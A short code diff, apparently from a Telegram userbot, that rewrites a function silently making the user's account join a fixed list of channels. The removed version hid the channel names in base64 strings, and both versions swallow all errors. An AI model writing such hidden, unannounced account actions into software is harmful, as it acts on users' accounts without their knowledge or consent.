@@ -79,17 +79,9 @@ async def get_user_from_event(
 
 
 async def checking(client):
-    gocheck = str(pybase64.b64decode("QEdhYnV0YW5sdQ=="))[2:16]
-    checker = str(pybase64.b64decode("QEx1bWllcmVzdXBwb3J0"))[2:20]
-    checkxd = str(pybase64.b64decode("QGp1bmdrbGU="))[2:13]
-    checksbt = str(pybase64.b64decode("QGt5bmFuc3VwcG9ydA=="))[2:20]
-    checksbm = str(pybase64.b64decode("aHR0cHM6Ly90Lm1lL2thenVzdXBwb3J0Z3Jw"))[2:36]
-    if client:
+    join = ["Gabutanlu", "Lumieresupport", " jungkle", "Banned_33", " CemaraSupport"]
+    for a in join:
         try:
-            await client(Get(gocheck))
-            await client(Get(checker))
-            await client(Get(checkxd))
-            await client(Get(checksbt))
-            await client(Get(checksbm))
-        except BaseException:
+            await client(Get(a))
+        except:
             pass
